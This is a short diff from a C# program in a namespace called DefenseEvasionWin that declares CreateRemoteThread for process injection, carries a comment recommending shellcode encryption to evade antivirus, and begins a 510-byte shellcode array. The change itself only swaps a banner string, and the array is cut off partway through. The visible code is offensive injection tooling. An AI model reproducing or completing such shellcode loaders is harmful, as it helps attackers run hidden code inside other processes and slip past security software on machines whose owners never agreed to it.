@@ -24,7 +24,7 @@ namespace DefenseEvasionWin
         public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr lpThreadAttrs, uint dwStackSize, IntPtr lpStartAddr, IntPtr lpParameter, uint dwCreationflags, IntPtr lpThId);
         static void Main(string[] args)
         {
-            Console.WriteLine("AFLABSecurity ");
+            Console.WriteLine("LVSEC ");
             //It is recommended to encrypt the shellcode to evade AV
             byte[] buf = new byte[510] {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
